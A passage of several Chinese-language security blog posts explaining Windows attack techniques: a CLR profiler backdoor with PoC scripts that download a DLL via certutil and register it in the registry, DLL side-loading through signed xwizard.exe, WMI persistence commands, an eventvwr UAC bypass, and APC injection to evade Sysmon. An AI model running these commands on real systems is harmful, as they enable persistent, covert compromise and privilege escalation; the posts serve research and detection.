<p>自然想到了修改环境变量</p>

<p>通常，修改环境变量使用面板操作的方式，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-28/3-1.png" alt="Alt text"></p>

<p>能否通过命令行修改环境变量呢？</p>

<p>自然想到了WMI</p>

<p>修改系统变量（需要管理员权限）：</p>

<p><code class="language-plaintext highlighter-rouge">wmic ENVIRONMENT create name="1",username="&lt;system&gt;",VariableValue="1"</code></p>

<p>修改当前用户变量（当前用户权限）：</p>

<p><code class="language-plaintext highlighter-rouge">wmic ENVIRONMENT create name="2",username="%username%",VariableValue="2"</code></p>

<p><strong>注：</strong></p>

<p>通过WMI修改环境变量需要系统重启或注销重新登录才能生效</p>

<p>接下来需要测试，是否只需要修改当前用户权限就能够实现作用于全局，答案是肯定的。</p>

<p>添加当前用户的环境变量：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic ENVIRONMENT create name="COR_ENABLE_PROFILING",username="%username%",VariableValue="1"

wmic ENVIRONMENT create name="COR_PROFILER",username="%username%",VariableValue="{11111111-1111-1111-1111-111111111111}"
</code></pre></div></div>

<p>重启后，成功修改，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-28/3-2.png" alt="Alt text"></p>

<p>现在直接启动.Net程序，弹框，成功加载msg.dll</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-28/3-3.png" alt="Alt text"></p>

<p>至此，后门思路验证成功</p>

<h2 id="0x04-poc编写">0x04 POC编写</h2>
<hr>

<p>对于32位操作系统，参考0x03的代码就好，x86 POC如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic ENVIRONMENT create name="COR_ENABLE_PROFILING",username="%username%",VariableValue="1"
wmic ENVIRONMENT create name="COR_PROFILER",username="%username%",VariableValue="{11111111-1111-1111-1111-111111111111}"
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete
SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32
REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg.dll" /F
REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F
</code></pre></div></div>

<p>对应64位系统，需要注意重定向问题，注册表存在32位和64位两个位置</p>

<p><strong>注:</strong></p>

<p>更多关于64位系统的重定向细节可参考文章《关于32位程序在64位系统下运行中需要注意的重定向问题》</p>

<p>结合到本文，32位需要对应32位的dll，64位对应64位的dll</p>

<p>所以，需要准备64位的dll，下载地址如下：</p>

<p>https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll</p>

<p>过程不再赘述，64位POC如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic ENVIRONMENT create name="COR_ENABLE_PROFILING",username="%username%",VariableValue="1"
wmic ENVIRONMENT create name="COR_PROFILER",username="%username%",VariableValue="{11111111-1111-1111-1111-111111111111}"
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll delete
SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32
REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg_x64.dll" /F
REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F 
SET KEY=HKEY_CURRENT_USER\Software\Classes\WoW6432Node\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32
REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg.dll" /F
REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F
</code></pre></div></div>

<p>能够分别劫持32位和64位的.Net程序，完整测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/CLR-Injection/master/poc.gif" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>更多代码细节可见github，地址如下：</p>

<p>https://github.com/3gstudent/CLR-Injection</p>

<h2 id="0x05-后门检测">0x05 后门检测</h2>
<hr>

<p>结合利用方式，检测方法如下：</p>

<ul>
  <li>检查环境变量<code class="language-plaintext highlighter-rouge">COR_ENABLE_PROFILING</code>和<code class="language-plaintext highlighter-rouge">COR_PROFILER</code></li>
  <li>检查注册表键值<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Classes\CLSID\</code></li>
</ul>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了通过CLR劫持.Net程序的后门，特点是无需管理员权限，并能够劫持所有.Net程序。更重要的是,系统默认会调用.net程序,导致后门自动触发。</p>

<h2 id="0x07-补充20171023">0x07 补充(20171023)</h2>

<p>Stefan Kanthak发现了这种利用方法，并且公开的时间比我要早，地址如下：</p>

<p>http://seclists.org/fulldisclosure/2017/Jul/11</p>

<p>并且，他利用CLR还实现了UAC绕过(这个思路我是后来从clem@clavoillotte的博客学到的)，该方法我也做了研究并写了一篇研究心得，地址如下：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-bypass-UAC/">《Use CLR to bypass UAC》</a></p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on July 28, 2017
  </div>

  
</article><article class="post">
  <h1>Use xwizard.exe to load dll</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的<a href="https://3gstudent.github.io/3gstudent.github.io/Use-Excel.Application-object's-RegisterXLL()-method-to-load-dll/">文章</a>介绍了利用Excel.Application object’s RegisterXLL()加载dll的技巧。本文继续，介绍最近学习到的一种更为通用的方法——利用xwizard.exe加载dll。
该方法最大的特点是xwizard.exe自带微软签名，在某种程度上说，能够绕过应用程序白名单的拦截。</p>

<p>参考链接：</p>

<p>http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>xwizard.exe简介</li>
  <li>利用思路</li>
  <li>实际测试</li>
</ul>

<h2 id="0x02-xwizardexe简介">0x02 xwizard.exe简介</h2>
<hr>

<p>应该为Extensible wizard的缩写，中文翻译可扩展的向导主机进程，暂时无法获得官方资料</p>

<ul>
  <li>支持Win7及以上操作系统</li>
  <li>位于%windir%\system32\下</li>
</ul>

<p>双击运行，弹出操作说明，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-3/2-1.png" alt="Alt text"></p>

<p>支持参数如下：</p>

<ul>
  <li>xwizard processXMLFile</li>
  <li>xwizard RunWizard</li>
  <li>xwizard RunPropertySheet</li>
</ul>

<p><strong>示例：</strong></p>

<ul>
  <li>
    <p>xwizard processXMLFile 1.txt</p>
  </li>
  <li>
    <p>xwizard RunWizard /u {11111111-1111-1111-1111-111111111111}</p>
  </li>
  <li>
    <p>xwizard RunPropertySheet /u {11111111-1111-1111-1111-111111111111}</p>
  </li>
</ul>

<p><strong>注：</strong></p>

<p>参数中的GUID长度固定，否则弹框报错，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-3/2-2.png" alt="Alt text"></p>

<h2 id="0x03-利用思路">0x03 利用思路</h2>
<hr>

<p>本节对Adam@Hexacorn的思路进行验证，文章地址：</p>

<p>http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/</p>

<p>xwizard.exe的同级目录存在一个特别的文件xwizards.dll</p>

<p>使用IDA查看xwizards.dll的导出函数，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-3/3-1.png" alt="Alt text"></p>

<p>我们可以看到，xwizards.dll的导出函数名称同xwizard.exe支持的参数名称十分接近</p>

<p>猜测xwizard.exe的功能是通过调用xwizards.dll实现的</p>

<p>使用IDA逆向xwizard.exe来验证我们的判断，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-3/3-2.png" alt="Alt text"></p>

<p>对于函数LoadLibraryEx，由于未指定dll的绝对路径，使用相对路径，所以搜索顺序为：</p>

<ol>
  <li>进程当前目录</li>
  <li>通过SetDllDirectory所设置的路径</li>
  <li>Windows系统目录+PATH，即c:\windows\system32</li>
  <li>16位系统目录，即c:\windows\system</li>
  <li>Windows目录，即c:\windows</li>
  <li>PATH环境变量中所列目录</li>
</ol>

<p>也就是说，如果将xwizard.exe复制到另一任意目录，在该同级目录再保存一个自己编写的xwizards.dll，那么执行xwizard.exe时会优先调用同级目录的xwizards.dll，不再加载%windir%\system32\下的xwizards.dll</p>

<p>这就实现了利用xwizard.exe加载我们自己编写的dll</p>

<h2 id="0x04-实际测试">0x04 实际测试</h2>
<hr>

<p>测试系统： Win7 x86</p>

<h3 id="1复制xwizardexe至新目录cx">1、复制xwizard.exe至新目录C:\x</h3>

<h3 id="2编写dll">2、编写dll</h3>

<p>使用vc 6.0，新建dll工程，在<code class="language-plaintext highlighter-rouge">case DLL_PROCESS_ATTACH</code>下添加弹框代码</p>

<p>过程及优化方法不再赘述，可参考文章<a href="https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/">《Use Office to maintain persistence》</a></p>

<p>编译好的dll下载地址如下:</p>

<p>https://github.com/3gstudent/test/blob/master/msg.dll</p>

<p>该dll成功加载后会弹框</p>

<h3 id="3测试">3、测试</h3>

<p>直接执行xwizard.exe，没有弹出帮助对话框</p>

<p>使用Process Monitor监控系统，检查xwizard.exe是否正常执行</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-3/4-1.png" alt="Alt text"></p>

<p>xwizard.exe正常执行，但是没有尝试加载xwizards.dll</p>

<p>再次测试，通过命令行执行，参数如下：</p>

<p><code class="language-plaintext highlighter-rouge">xwizard processXMLFile 1.txt</code></p>

<p>查看Process Monitor输出结果</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-3/4-2.png" alt="Alt text"></p>

<p>xwizard.exe首先尝试加载<code class="language-plaintext highlighter-rouge">C:\x\xwizards.dll</code>,加载失败后再尝试加载<code class="language-plaintext highlighter-rouge">C:\windows\system32\xwizards.dll</code>（再次印证了对dll加载顺序的判断）</p>

<p>接下来，将msg.dll重命名为xwizards.dll，保存在<code class="language-plaintext highlighter-rouge">C:\x</code></p>

<p>命令行执行：</p>

<p><code class="language-plaintext highlighter-rouge">xwizard processXMLFile 1.txt</code></p>

<p>成功加载C:\x\xwizards.dll，弹出对话框</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-3/4-3.png" alt="Alt text"></p>

<p>测试成功</p>

<h2 id="0x05-补充">0x05 补充</h2>
<hr>

<p>64位系统：</p>

<p><code class="language-plaintext highlighter-rouge">%windir%\system32\</code>对应64位xwizard.exe，只能加载64位xwizards.dll</p>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-3/5-1.png" alt="Alt text"></p>

<p><code class="language-plaintext highlighter-rouge">%windir%\SysWOW64\</code>对应32位xwizard.exe，只能加载32位xwizards.dll</p>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-8-3/5-2.png" alt="Alt text"></p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了利用xwizard.exe加载dll的技巧，特别的地方在于xwizard.exe包含微软签名，因此在某种程度上说，能够绕过应用程序白名单的拦截。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on August  3, 2017
  </div>

  
</article><article class="post">
  <h1>Study Notes of WMI Persistence using wmic.exe</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>
<p>最近学习了Matt Graeber@mattifestation分享的方法《WMI Persistence using wmic.exe》，让我对WMI的攻击技巧有了新的认识，本文将结合之前的研究心得，分享利用wmic的一些技巧。</p>

<p><strong>参考资料：</strong></p>

<p>http://www.exploit-monday.com/2016/08/wmi-persistence-using-wmic.html</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>
<p>在之前的文章《WMI Attacks》、《WMI Backdoor》、《WMI Defense》中分享了通过Poweshell和mof调用WMI实现的攻击技巧，
同样，使用wmic.exe也能达到相同的效果，而且更加直接，只要在cmd下直接运行命令就好。</p>

<h2 id="0x02-搜集信息">0x02 搜集信息</h2>
<hr>
<p><strong>获取操作系统相关信息</strong></p>

<p>poweshell代码如下：</p>

<p><code class="language-plaintext highlighter-rouge">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_OperatingSystem</code></p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-16/2-1.PNG" alt="Alt text"></p>

<p>换成wmic.exe的命令为：</p>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_OperatingSystem</code></p>

<p>回显如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-16/2-2.PNG" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>回显内容的格式没有对齐，需要添加参数指定输出格式</p>

<p>按照powershell回显的分行显示,需要添加如下参数：</p>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_OperatingSystem GET /all /FORMAT:list</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-16/2-3.PNG" alt="Alt text"></p>

<p>依此格式，其他通过powershell调用wmi查询的方法均可用wmic实现，例如：</p>

<p>powershell代码：</p>

<p><code class="language-plaintext highlighter-rouge">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_ComputerSystem</code></p>

<p>对应</p>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_ComputerSystem GET /all /FORMAT:list</code></p>

<p>将结果输出到文件的方法：</p>

<p><code class="language-plaintext highlighter-rouge">wmic /OUTPUT:c:\test\1.txt /NAMESPACE:"\\root\CIMV2" PATH Win32_ComputerSystem GET /all /FORMAT:list</code></p>

<h2 id="0x03-注册表操作">0x03 注册表操作</h2>

<p>powershell代码如下：</p>

<p><code class="language-plaintext highlighter-rouge">Get-WmiObject -Namespace ROOT\DEFAULT -Class StdRegProv</code></p>

<p><code class="language-plaintext highlighter-rouge">Push-Location HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles</code></p>

<p><code class="language-plaintext highlighter-rouge">Get-ItemProperty Sys</code></p>

<p>完整的wmic代码如下：</p>

<p>枚举子项：</p>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call EnumKey ^&amp;H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles"</code></p>

<p>注册表内容如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-16/2-4.PNG" alt="Alt text"></p>

<p>命令返回的结果如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-16/2-5.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p><code class="language-plaintext highlighter-rouge">Method execution successful</code>不代表一定能够获得正确的返回结果，此处需要注意参数的正确填写,如图2-6，故意漏掉”,仍然提示<code class="language-plaintext highlighter-rouge">Method execution successful</code>，但返回结果错误</p>

<p>枚举指定的关键值：</p>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call EnumValues  ^&amp;H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\Sys"</code></p>

<p>返回结果如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-16/2-7.png" alt="Alt text"></p>

<p>获取指定值的字符串数据值：</p>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call GetStringValue ^&amp;H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\Sys","TasksDir"</code></p>

<p>返回结果如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-16/2-8.png" alt="Alt text"></p>

<p>创建子项:</p>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call CreateKey ^&amp;H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\test"</code></p>

<p>返回结果如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-16/2-9.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>需要注意权限问题，此处需要管理员权限</p>

<p>设置一个命名值的字符串值：</p>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call SetStringValue ^&amp;H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\test","Data","Name"</code></p>

<p>返回结果如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-16/3-1.png" alt="Alt text"></p>

<p><strong>注：</strong>
如果一个命名值不存在，则新建；如果存在，则为修改</p>

<p>删除子项：</p>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call DeleteKey ^&amp;H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\test"</code></p>

<p>删除设置一个命名值：</p>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\DEFAULT" path stdregprov call DeleteValue ^&amp;H80000002,"SOFTWARE\Microsoft\Windows\CurrentVersion\RenameFiles\test","Name"</code></p>

<p><strong>注：</strong></p>

<p>以上参数说明参考自https://msdn.microsoft.com/en-us/library/aa393664(VS.85).aspx</p>

<p>特殊字符<code class="language-plaintext highlighter-rouge">^&amp;H80000002</code>含义如下：</p>

<p>&amp;H80000000 ‘HKEY_CLASSES_ROOT</p>

<p>&amp;H80000001 ‘HKEY_CURRENT_USER</p>

<p>&amp;H80000002 ‘HKEY_LOCAL_MACHINE</p>

<p>&amp;H80000003 ‘HKEY_USERS</p>

<p>&amp;H80000005 ‘HKEY_CURRENT_CONFIG</p>

<h2 id="0x04-虚拟机检测">0x04 虚拟机检测</h2>

<h3 id="1查看totalphysicalmemory和numberoflogicalprocessors">1、查看TotalPhysicalMemory和NumberOfLogicalProcessors</h3>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_ComputerSystem GET NumberOfLogicalProcessors,TotalPhysicalMemory /FORMAT:list</code></p>

<p>返回结果如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-16/3-2.png" alt="Alt text"></p>

<h3 id="2查看当前进程">2、查看当前进程</h3>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_Process GET Caption /FORMAT:list</code></p>

<h2 id="0x05-wmi-persistence">0x05 WMI Persistence</h2>
<p>Powershell完整的实现代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$filterName = 'BotFilter82'
$consumerName = 'BotConsumer23'
$exePath = 'C:\Windows\System32\notepad.exe'
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop
$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name=$consumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
</code></pre></div></div>

<p>接下来分步介绍对应wmic调用的过程</p>

<h3 id="1create-an-__eventfilter-instance">1、Create an __EventFilter instance</h3>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BotFilter82", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"</code></p>

<h3 id="2create-an-__eventconsumer-instance">2、Create an __EventConsumer instance</h3>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BotConsumer23", ExecutablePath="C:\Windows\System32\notepad.exe",CommandLineTemplate="C:\Windows\System32\notepad.exe"</code></p>

<h3 id="3create-a-__filtertoconsumerbinding-instance">3、Create a __FilterToConsumerBinding instance</h3>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"BotFilter82\"", Consumer="CommandLineEventConsumer.Name=\"BotConsumer23\""</code></p>

<h3 id="4list-the-__eventfilter-and-__eventconsumer-instances">4、List the __EventFilter and __EventConsumer instances</h3>

<p><strong>Filters：</strong></p>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter GET __RELPATH /FORMAT:list</code></p>

<p><strong>Event Consumers：</strong></p>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list</code></p>

<p><strong>Event Bindings：</strong></p>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list</code></p>

<p>通过powershell下查看的代码：</p>

<p><strong>Filters：</strong></p>

<p><code class="language-plaintext highlighter-rouge">Get-WMIObject -Namespace root\Subscription -Class __EventFilter</code></p>

<p><strong>Event Consumers：</strong></p>

<p><code class="language-plaintext highlighter-rouge">Get-WMIObject -Namespace root\Subscription -Class __EventConsumer</code></p>

<p><strong>Event Bindings：</strong></p>

<p><code class="language-plaintext highlighter-rouge">Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding</code></p>

<h3 id="5remove-all-instances">5、Remove all instances</h3>
<p><strong>Filters：</strong></p>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter WHERE Name="BotFilter82" DELETE</code></p>

<p><strong>Event Consumers：</strong></p>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="BotConsumer23" DELETE</code></p>

<p><strong>Event Bindings：</strong></p>

<p><code class="language-plaintext highlighter-rouge">wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding WHERE Filter="__EventFilter.Name='BotFilter82'" DELETE</code></p>

<p><strong>注：</strong></p>

<p>wmic中Binding的Filter判断参数”BotFilter82”中”要变成’</p>

<p>通过powershell清除的实现代码：</p>

<p><strong>Filters：</strong></p>

<p><code class="language-plaintext highlighter-rouge">Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='BotFilter82'" | Remove-WmiObject -Verbose</code></p>

<p><strong>Event Consumers：</strong></p>

<p><code class="language-plaintext highlighter-rouge">Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='BotConsumer23'" | Remove-WmiObject -Verbose</code></p>

<p><strong>Event Bindings：</strong></p>

<p><code class="language-plaintext highlighter-rouge">Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%BotFilter82%'" | Remove-WmiObject -Verbose</code></p>

<h2 id="0x05-fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking">0x05 fileless uac bypass using eventvwr exe and registry hijacking</h2>

<p>wmic的部分操作需要管理员权限，在这里补充一个刚学到的UACbypass技巧</p>

<p><strong>fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking</strong></p>

<p><strong>学习链接：</strong></p>

<p>https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/</p>

<p><strong>作者：</strong></p>

<p>Matt Nelson @enigma0x3</p>

<h3 id="原理">原理</h3>

<p>在进程eventvwr.exe启动的时候，首先查找注册表位置<code class="language-plaintext highlighter-rouge">HKCU\Software\Classes\mscfile\shell\open\command</code>,如果该处为空，接着查找注册表位置<code class="language-plaintext highlighter-rouge">HKCR\mscfile\shell\open\command</code>(此处默认值为<code class="language-plaintext highlighter-rouge">%SystemRoot%\system32\mmc.exe "%1" %*</code>),以高权限启动mmc.exe,最后打开eventvwr.msc。</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-8-16/3-3.png" alt="Alt text"></p>

<p>接下来，如果在注册表<code class="language-plaintext highlighter-rouge">HKCU\Software\Classes\mscfile\shell\open\command</code>中添加payload，就可以在启动mmc.exe之前执行预设的payload</p>

<p><strong>最重要的一点：</strong></p>

<p>修改注册表<code class="language-plaintext highlighter-rouge">HKCU\Software\Classes\mscfile\shell\open\command</code>的键值只需要普通用户权限即可</p>

<h3 id="实现">实现</h3>

<p>作者分享了通过powershell实现的poc代码，链接如下：</p>

<p>https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1</p>

<p>如果poc成功执行，会在C:\UACBypassTest下写入”Is Elevated: True”</p>

<p><strong>注：</strong></p>

<p>默认操作c:\目录下的文件会被uac拦截</p>

<p>我fork了作者的代码，作了细微修改，运行如下命令：</p>

<p><code class="language-plaintext highlighter-rouge">C:\Windows\System32\cmd.exe /c copy c:\test\1.txt c:\1.txt</code></p>

<p>地址为：</p>

<p>https://github.com/3gstudent/UAC-Bypass/blob/master/Invoke-EventVwrBypass.ps1</p>

<h3 id="优点">优点</h3>

<p>该方法同常规的方法有很大不同，优点如下：</p>

<ul>
  <li>
    <p>无文件</p>
  </li>
  <li>
    <p>不需要进程注入</p>
  </li>
  <li>
    <p>不需要复制特权文件</p>
  </li>
</ul>

<h3 id="适用环境">适用环境</h3>

<p>Win7</p>

<p>Win8.1</p>

<p>Win 10</p>

<h3 id="防御">防御</h3>

<ul>
  <li>
    <p>set the UAC level to “Always Notify”</p>
  </li>
  <li>
    <p>remove the current user from the Local Administrators group</p>
  </li>
  <li>
    <p>alert on new registry entries in HKCU\Software\Classes\</p>
  </li>
</ul>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on August 16, 2016
  </div>

  
</article><article class="post">
  <h1>通过APC实现Dll注入——绕过Sysmon监控</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>要对指定进程进行远程注入，通常使用Windows提供的API CreateRemoteThread创建一个远程线程，进而注入dll或是执行shellcode</p>

<p>Sysmon可用来监控和记录系统活动，可记录CreateRemoteThread操作</p>

<p>注入的方法不只有CreateRemoteThread，能否通过其他注入方式绕过Sysmon的监控呢？</p>

<p>Casey Smith@subTee在他的文章中给出了答案：</p>

<p><code class="language-plaintext highlighter-rouge">Shellcode Injection via QueueUserAPC - Hiding From Sysmon</code></p>

<p><strong>地址如下：</strong></p>

<p>http://subt0x10.blogspot.com/2017/01/shellcode-injection-via-queueuserapc.html</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍如下内容：</p>

<ul>
  <li>Sysmon配置测试，监控CreateRemoteThread操作</li>
  <li>c++实现通过APC对Dll注入</li>
  <li>绕过Sysmon测试</li>
  <li>Casey Smith@subTee分享的C#实现代码和用途</li>
</ul>

<h3 id="sysmon">Sysmon：</h3>

<p>可用来监控和记录系统活动，并记录到windows事件日志，包含如下事件：</p>

<ul>
  <li>Event ID 1: Process creation</li>
  <li>Event ID 2: A process changed a file creation time</li>
  <li>Event ID 3: Network connection</li>
  <li>Event ID 4: Sysmon service state changed</li>
  <li>Event ID 5: Process terminated</li>
  <li>Event ID 6: Driver loaded</li>
  <li>Event ID 7: Image loaded</li>
  <li>Event ID 8: CreateRemoteThread</li>
  <li>Event ID 9: RawAccessRead</li>
  <li>Event ID 10: ProcessAccess</li>
  <li>Event ID 11: FileCreate</li>
  <li>Event ID 12: RegistryEvent (Object create and delete)</li>
  <li>Event ID 13: RegistryEvent (Value Set)</li>
  <li>Event ID 14: RegistryEvent (Key and Value Rename)</li>
  <li>Event ID 15: FileCreateStreamHash</li>
  <li>Event ID 255: Error</li>
</ul>

<p>详情见https://technet.microsoft.com/en-us/sysinternals/sysmon</p>

<p><strong>注：</strong></p>

<p>CreateRemoteThread为Event ID 8</p>

<h3 id="dll注入">Dll注入</h3>

<p>常见方法：</p>

<ul>
  <li>创建新线程</li>
  <li>设置线程上下背景文，修改寄存器</li>
  <li>插入Apc队列</li>
  <li>修改注册表</li>
  <li>挂钩窗口消息</li>
  <li>远程手动实现LoadLibrary</li>
</ul>

<p>引用自http://www.cnblogs.com/uAreKongqi/p/6012353.html</p>

